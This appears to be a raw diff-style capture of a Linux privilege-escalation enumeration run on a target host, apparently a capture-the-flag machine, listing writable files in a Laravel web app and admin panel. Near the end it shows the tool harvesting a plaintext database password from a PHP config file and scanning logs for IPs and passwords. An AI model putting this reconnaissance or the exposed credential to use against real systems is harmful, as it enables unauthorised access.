+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
+/var/lib/php/sessions
+/var/tmp
+/var/www/admin
+/var/www/admin/.welcome.php.swp
+/var/www/admin/config.php
+/var/www/admin/index.php
+/var/www/admin/logout.php
+/var/www/admin/session.php
+/var/www/admin/welcome.php
+/var/www/html
+/var/www/html/index.html
+/var/www/laravel
+/var/www/laravel/.env
+/var/www/laravel/.git
+/var/www/laravel/.git/HEAD
+/var/www/laravel/.git/branches
+/var/www/laravel/.git/config
+/var/www/laravel/.git/description
+/var/www/laravel/.git/hooks
+/var/www/laravel/.git/hooks/applypatch-msg.sample
+/var/www/laravel/.git/hooks/commit-msg.sample
+/var/www/laravel/.git/hooks/post-update.sample
+/var/www/laravel/.git/hooks/pre-applypatch.sample
+/var/www/laravel/.git/hooks/pre-commit.sample
+/var/www/laravel/.git/hooks/pre-push.sample
+/var/www/laravel/.git/hooks/pre-rebase.sample
+/var/www/laravel/.git/hooks/prepare-commit-msg.sample
+/var/www/laravel/.git/hooks/update.sample
+/var/www/laravel/.git/index
+/var/www/laravel/.git/info
+/var/www/laravel/.git/info/exclude
+/var/www/laravel/.git/logs
+/var/www/laravel/.git/logs/HEAD
+/var/www/laravel/.git/logs/refs
+/var/www/laravel/.git/logs/refs/heads
+/var/www/laravel/.git/logs/refs/heads/master
+/var/www/laravel/.git/logs/refs/remotes
+/var/www/laravel/.git/logs/refs/remotes/origin
+/var/www/laravel/.git/logs/refs/remotes/origin/HEAD
+/var/www/laravel/.git/objects
+/var/www/laravel/.git/objects/info
+/var/www/laravel/.git/objects/pack
+/var/www/laravel/.git/objects/pack/pack-74fa3b6d97d942c652cea224987f7c73a85e058c.idx
+/var/www/laravel/.git/objects/pack/pack-74fa3b6d97d942c652cea224987f7c73a85e058c.pack
+/var/www/laravel/.git/packed-refs
+/var/www/laravel/.git/refs
+/var/www/laravel/.git/refs/heads
+/var/www/laravel/.git/refs/heads/master
+/var/www/laravel/.git/refs/remotes
+/var/www/laravel/.git/refs/remotes/origin
+/var/www/laravel/.git/refs/remotes/origin/HEAD
+/var/www/laravel/.git/refs/tags
+/var/www/laravel/.gitattributes
+/var/www/laravel/.gitignore
+/var/www/laravel/CHANGELOG.md
+/var/www/laravel/app
+/var/www/laravel/app/Console
+/var/www/laravel/app/Console/Kernel.php
+/var/www/laravel/app/Exceptions
+/var/www/laravel/app/Exceptions/Handler.php
+/var/www/laravel/app/Http
+/var/www/laravel/app/Http/Controllers
+/var/www/laravel/app/Http/Controllers/Auth
+/var/www/laravel/app/Http/Controllers/Auth/ForgotPasswordController.php
+/var/www/laravel/app/Http/Controllers/Auth/LoginController.php
+/var/www/laravel/app/Http/Controllers/Auth/RegisterController.php
+/var/www/laravel/app/Http/Controllers/Auth/ResetPasswordController.php
+/var/www/laravel/app/Http/Controllers/Controller.php
+/var/www/laravel/app/Http/Kernel.php
+/var/www/laravel/app/Http/Middleware
+/var/www/laravel/app/Http/Middleware/EncryptCookies.php
+/var/www/laravel/app/Http/Middleware/RedirectIfAuthenticated.php
+/var/www/laravel/app/Http/Middleware/TrimStrings.php
+/var/www/laravel/app/Http/Middleware/VerifyCsrfToken.php
+/var/www/laravel/app/Providers
+/var/www/laravel/app/Providers/AppServiceProvider.php
+/var/www/laravel/app/Providers/AuthServiceProvider.php
+/var/www/laravel/app/Providers/BroadcastServiceProvider.php
+/var/www/laravel/app/Providers/EventServiceProvider.php
+/var/www/laravel/app/Providers/RouteServiceProvider.php
+/var/www/laravel/app/User.php
+/var/www/laravel/artisan
+/var/www/laravel/bootstrap
+/var/www/laravel/bootstrap/app.php
+/var/www/laravel/bootstrap/autoload.php
+/var/www/laravel/bootstrap/cache
+/var/www/laravel/bootstrap/cache/.gitignore
+/var/www/laravel/bootstrap/cache/services.php
+/var/www/laravel/composer.json
+/var/www/laravel/composer.lock
+/var/www/laravel/composer.phar
+/var/www/laravel/config
+/var/www/laravel/config/app.php
+/var/www/laravel/config/auth.php
+/var/www/laravel/config/broadcasting.php
+/var/www/laravel/config/cache.php
+/var/www/laravel/config/database.php
+/var/www/laravel/config/filesystems.php
+/var/www/laravel/config/mail.php
+/var/www/laravel/config/queue.php
+/var/www/laravel/config/services.php
+/var/www/laravel/config/session.php
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/laravel/database
+/var/www/laravel/database/.gitignore
+/var/www/laravel/database/factories
+/var/www/laravel/database/factories/ModelFactory.php
+/var/www/laravel/database/migrations
+/var/www/laravel/database/migrations/2014_10_12_000000_create_users_table.php
+/var/www/laravel/database/migrations/2014_10_12_100000_create_password_resets_table.php
+/var/www/laravel/database/seeds
+/var/www/laravel/database/seeds/DatabaseSeeder.php
+/var/www/laravel/package.json
+/var/www/laravel/phpunit.xml
+/var/www/laravel/public
+/var/www/laravel/public/.htaccess
+/var/www/laravel/public/css
+/var/www/laravel/public/css/app.css
+/var/www/laravel/public/favicon.ico
+/var/www/laravel/public/index.php
+/var/www/laravel/public/js
+/var/www/laravel/public/js/app.js
+/var/www/laravel/public/robots.txt
+/var/www/laravel/public/web.config
+/var/www/laravel/readme.md
+/var/www/laravel/resources
+/var/www/laravel/resources/assets
+/var/www/laravel/resources/assets/js
+/var/www/laravel/resources/assets/js/app.js
+/var/www/laravel/resources/assets/js/bootstrap.js
+/var/www/laravel/resources/assets/js/components
+/var/www/laravel/resources/assets/js/components/Example.vue
+/var/www/laravel/resources/assets/sass
+/var/www/laravel/resources/assets/sass/_variables.scss
+/var/www/laravel/resources/assets/sass/app.scss
+/var/www/laravel/resources/lang
+/var/www/laravel/resources/lang/en
+/var/www/laravel/resources/lang/en/auth.php
+/var/www/laravel/resources/lang/en/pagination.php
+/var/www/laravel/resources/lang/en/passwords.php
+/var/www/laravel/resources/lang/en/validation.php
+/var/www/laravel/resources/views
+/var/www/laravel/resources/views/welcome.blade.php
+/var/www/laravel/routes
+/var/www/laravel/routes/api.php
+/var/www/laravel/routes/channels.php
+/var/www/laravel/routes/console.php
+/var/www/laravel/routes/web.php
+/var/www/laravel/server.php
+/var/www/laravel/storage
+/var/www/laravel/storage/app
+/var/www/laravel/storage/app/.gitignore
+/var/www/laravel/storage/app/public
+/var/www/laravel/storage/app/public/.gitignore
+/var/www/laravel/storage/framework
+/var/www/laravel/storage/framework/.gitignore
+/var/www/laravel/storage/framework/cache
+/var/www/laravel/storage/framework/cache/.gitignore
+/var/www/laravel/storage/framework/sessions
+/var/www/laravel/storage/framework/sessions/.gitignore
+/var/www/laravel/storage/framework/sessions/3AYpYTINQ2kOZ3xkRZM6CsQ8T5AijykM3bZ9nacu
+/var/www/laravel/storage/framework/sessions/4lWkivNrbVuV3m9RZ9zQVrZqT2nyvYlPIuQSSIY1
+/var/www/laravel/storage/framework/sessions/5PxoqxgLQTtHejQnlnRA2bO0T3fdwGy0cVVbwXqc
+/var/www/laravel/storage/framework/sessions/ADtMKWgiWLC1mDeb0rIGmEptVfO9QymDlUzrwyXM
+/var/www/laravel/storage/framework/sessions/Eh9YrveLzambbLQtUfVmjF55kHcGSe71n8hMG0Hw
+/var/www/laravel/storage/framework/sessions/FN3lutVJT43d3HK689A2l0qvJBtsf2xjj0eSmqso
+/var/www/laravel/storage/framework/sessions/FYIxow2U7Z7zDRKfcY0qc2ygOgkfpjOp65F9MOai
+/var/www/laravel/storage/framework/sessions/Fl0hUrczRVhWjOuYuoqeXzY98N2pDHtKJIM8MZYO
+/var/www/laravel/storage/framework/sessions/MpepzzwCARAP5fkPLomM0HF3kjjwqCztQFMIgGTC
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/laravel/storage/framework/testing
+/var/www/laravel/storage/framework/testing/.gitignore
+/var/www/laravel/storage/framework/views
+/var/www/laravel/storage/framework/views/.gitignore
+/var/www/laravel/storage/framework/views/24f4512b760336fe6f663d547ab4b08077451f92.php
+/var/www/laravel/storage/logs
+/var/www/laravel/storage/logs/.gitignore
+/var/www/laravel/tests
+/var/www/laravel/tests/CreatesApplication.php
+/var/www/laravel/tests/Feature
+/var/www/laravel/tests/Feature/ExampleTest.php
+/var/www/laravel/tests/TestCase.php
+/var/www/laravel/tests/Unit
+/var/www/laravel/tests/Unit/ExampleTest.php
+/var/www/laravel/vendor
+/var/www/laravel/vendor/autoload.php
+/var/www/laravel/vendor/bin
+/var/www/laravel/vendor/composer
+/var/www/laravel/vendor/composer/ClassLoader.php
+/var/www/laravel/vendor/composer/LICENSE
+/var/www/laravel/vendor/composer/autoload_classmap.php
+/var/www/laravel/vendor/composer/autoload_files.php
+/var/www/laravel/vendor/composer/autoload_namespaces.php
+/var/www/laravel/vendor/composer/autoload_psr4.php
+/var/www/laravel/vendor/composer/autoload_real.php
+/var/www/laravel/vendor/composer/autoload_static.php
+/var/www/laravel/vendor/composer/installed.json
+/var/www/laravel/vendor/dnoegel
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/.gitignore
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/LICENSE
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/README.md
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/composer.json
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/phpunit.xml.dist
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/src
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/src/Xdg.php
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/tests
+/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/tests/XdgTest.php
+/var/www/laravel/vendor/doctrine
+/var/www/laravel/vendor/doctrine/inflector
+/var/www/laravel/vendor/doctrine/inflector/.gitignore
+/var/www/laravel/vendor/doctrine/inflector/.travis.yml
+/var/www/laravel/vendor/doctrine/inflector/LICENSE
+/var/www/laravel/vendor/doctrine/inflector/README.md
+/var/www/laravel/vendor/doctrine/inflector/composer.json
+/var/www/laravel/vendor/doctrine/inflector/lib
+/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine
+/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine/Common
+/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector
+/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/Inflector.php
+/var/www/laravel/vendor/doctrine/inflector/phpunit.xml.dist
+/var/www/laravel/vendor/doctrine/inflector/tests
+/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine
+/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests
+/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/Common
+/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/Common/Inflector
+/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/Common/Inflector/InflectorTest.php
+/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/DoctrineTestCase.php
+/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/TestInit.php
+/var/www/laravel/vendor/doctrine/instantiator
+/var/www/laravel/vendor/doctrine/instantiator/.gitignore
+/var/www/laravel/vendor/doctrine/instantiator/.scrutinizer.yml
+/var/www/laravel/vendor/doctrine/instantiator/.travis.install.sh
+/var/www/laravel/vendor/doctrine/instantiator/.travis.yml
+/var/www/laravel/vendor/doctrine/instantiator/CONTRIBUTING.md
+/var/www/laravel/vendor/doctrine/instantiator/LICENSE
+/var/www/laravel/vendor/doctrine/instantiator/README.md
+/var/www/laravel/vendor/doctrine/instantiator/composer.json
+/var/www/laravel/vendor/doctrine/instantiator/phpmd.xml.dist
+/var/www/laravel/vendor/doctrine/instantiator/phpunit.xml.dist
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine
+/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator
+/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception
+/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception/ExceptionInterface.php
+/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception/InvalidArgumentException.php
+/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception/UnexpectedValueException.php
+/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Instantiator.php
+/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/InstantiatorInterface.php
+/var/www/laravel/vendor/doctrine/instantiator/tests
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorPerformance
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorPerformance/InstantiatorPerformanceEvent.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/Exception
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/Exception/InvalidArgumentExceptionTest.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/Exception/UnexpectedValueExceptionTest.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/InstantiatorTest.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/AbstractClassAsset.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/ArrayObjectAsset.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/ExceptionAsset.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/FinalExceptionAsset.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/PharAsset.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/PharExceptionAsset.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/SerializableArrayObjectAsset.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/SimpleSerializableAsset.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/SimpleTraitAsset.php
+/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/UnCloneableAsset.php
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/laravel/vendor/erusev
+/var/www/laravel/vendor/erusev/parsedown
+/var/www/laravel/vendor/erusev/parsedown/.travis.yml
+/var/www/laravel/vendor/erusev/parsedown/LICENSE.txt
+/var/www/laravel/vendor/erusev/parsedown/Parsedown.php
+/var/www/laravel/vendor/erusev/parsedown/README.md
+/var/www/laravel/vendor/erusev/parsedown/composer.json
+/var/www/laravel/vendor/erusev/parsedown/phpunit.xml.dist
+/var/www/laravel/vendor/erusev/parsedown/test
+/var/www/laravel/vendor/erusev/parsedown/test/CommonMarkTest.php
+/var/www/laravel/vendor/erusev/parsedown/test/ParsedownTest.php
+/var/www/laravel/vendor/erusev/parsedown/test/TestParsedown.php
+/var/www/laravel/vendor/erusev/parsedown/test/bootstrap.php
+/var/www/laravel/vendor/erusev/parsedown/test/data
+/var/www/laravel/vendor/erusev/parsedown/test/data/aesthetic_table.html
+/var/www/laravel/vendor/erusev/parsedown/test/data/aesthetic_table.md
+/var/www/laravel/vendor/erusev/parsedown/test/data/aligned_table.html
+/var/www/laravel/vendor/erusev/parsedown/test/data/aligned_table.md
+/var/www/laravel/vendor/erusev/parsedown/test/data/atx_heading.html
+/var/www/laravel/vendor/erusev/parsedown/test/data/atx_heading.md
+/var/www/laravel/vendor/erusev/parsedown/test/data/automatic_link.html
+/var/www/laravel/vendor/erusev/parsedown/test/data/automatic_link.md
+/var/www/laravel/vendor/erusev/parsedown/test/data/block-level_html.html
+/var/www/laravel/vendor/erusev/parsedown/test/data/block-level_html.md
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/laravel/vendor/fzaninotto
+/var/www/laravel/vendor/fzaninotto/faker
+/var/www/laravel/vendor/fzaninotto/faker/.gitignore
+/var/www/laravel/vendor/fzaninotto/faker/.travis.yml
+/var/www/laravel/vendor/fzaninotto/faker/CHANGELOG.md
+/var/www/laravel/vendor/fzaninotto/faker/CONTRIBUTING.md
+/var/www/laravel/vendor/fzaninotto/faker/LICENSE
+/var/www/laravel/vendor/fzaninotto/faker/Makefile
+/var/www/laravel/vendor/fzaninotto/faker/composer.json
+/var/www/laravel/vendor/fzaninotto/faker/phpunit.xml.dist
+/var/www/laravel/vendor/fzaninotto/faker/readme.md
+/var/www/laravel/vendor/fzaninotto/faker/src
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Calculator
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Calculator/Iban.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Calculator/Luhn.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Documentor.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Factory.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Generator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Guesser
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Guesser/Name.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP/ColumnTypeGuesser.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP/EntityPopulator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP/Populator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine/ColumnTypeGuesser.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine/EntityPopulator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine/Populator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango/ColumnTypeGuesser.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango/EntityPopulator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango/Populator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel/ColumnTypeGuesser.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel/EntityPopulator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel/Populator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2/ColumnTypeGuesser.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2/EntityPopulator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2/Populator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot/ColumnTypeGuesser.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot/EntityPopulator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot/Populator.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Address.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Barcode.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Base.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Biased.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Color.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Company.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/DateTime.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/File.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Image.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Address.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Company.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Person.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Text.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Address.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Company.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Person.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Text.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/at_AT
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/at_AT/Payment.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/Internet.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/Payment.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/Person.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/PhoneNumber.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Address.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Company.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Person.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/PhoneNumber.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Utils.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Address.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Company.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/DateTime.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Internet.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Payment.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Person.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/PhoneNumber.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Text.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Address.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Company.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Internet.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Payment.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Person.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/PhoneNumber.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Address.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Company.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Internet.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Payment.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Person.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/PhoneNumber.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Text.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Address.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Company.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Internet.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Payment.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Person.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/PhoneNumber.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Text.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Address.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Company.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Internet.php
+/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Payment.php
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group www-data:
+
+
+[+] Searching passwords in config PHP files
+   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
+
+[+] Finding IPs inside logs (limit 70)
+     14 /var/log/dpkg.log:1.16.04.3
+     11 /var/log/dpkg.log:1.16.04.1
+      7 /var/log/wtmp:192.168.150.100
+      4 /var/log/installer/status:1.2.3.3
+      2 /var/log/apt/history.log:1.16.04.3
+      1 /var/log/wtmp:10.10.14.141
+      1 /var/log/lastlog:10.10.14.141
+      1 /var/log/installer/status:2.21.63.3
+      1 /var/log/apt/history.log:1.16.04.1
+
+[+] Finding passwords inside logs (limit 70)
+/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
+/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
+/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
+/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
+/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
+/var/log/bootstrap.log:Selecting previously unselected package passwd.
+/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...
+/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...
+/var/log/bootstrap.log:Shadow passwords are now on.
+/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...
+/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...
+/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...
+/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
+/var/log/dpkg.log:2017-02-15 20:19:39 configure base-passwd:amd64 3.5.39 3.5.39
+/var/log/dpkg.log:2017-02-15 20:19:39 install base-passwd:amd64 <none> 3.5.39
+/var/log/dpkg.log:2017-02-15 20:19:39 status half-configured base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:19:39 status half-installed base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:19:39 status installed base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:19:39 status unpacked base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:19:43 status half-configured base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:19:43 status half-installed base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:19:43 status unpacked base-passwd:amd64 3.5.39
+/var/log/dpkg.log:2017-02-15 20:19:43 upgrade base-passwd:amd64 3.5.39 3.5.39
